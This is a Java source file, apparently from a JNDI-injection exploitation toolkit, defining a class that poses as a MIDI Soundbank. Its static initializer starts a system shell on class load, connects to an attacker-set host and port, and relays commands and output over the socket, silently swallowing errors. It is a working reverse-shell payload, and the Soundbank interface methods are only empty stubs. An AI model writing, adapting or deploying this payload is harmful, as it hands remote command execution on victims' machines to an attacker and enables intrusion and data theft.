package map.jndi.template;

import javax.sound.midi.Instrument;
import javax.sound.midi.Patch;
import javax.sound.midi.Soundbank;
import javax.sound.midi.SoundbankResource;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class SoundbankReverseShell implements Soundbank {
    public static String host;
    public static int port;

    static {
        try {
            String shell = System.getProperty("os.name").toLowerCase().contains("win") ? "cmd" : "sh";
            Process p = new ProcessBuilder(shell).redirectErrorStream(true).start();
            Socket s = new Socket(host, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0)
                    so.write(pi.read());
                while (pe.available() > 0)
                    so.write(pe.read());
                while (si.available() > 0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) { }
            }
            p.destroy();
            s.close();
        } catch (Exception e) { }
    }

    @Override
    public String getName() {
        return "";
    }

    @Override
    public String getVersion() {
        return "";
    }

    @Override
    public String getVendor() {
        return "";
    }

    @Override
    public String getDescription() {
        return "";
    }

    @Override
    public SoundbankResource[] getResources() {
        return new SoundbankResource[0];
    }

    @Override
    public Instrument[] getInstruments() {
        return new Instrument[0];
    }

    @Override
    public Instrument getInstrument(Patch patch) {
        return null;
    }
}
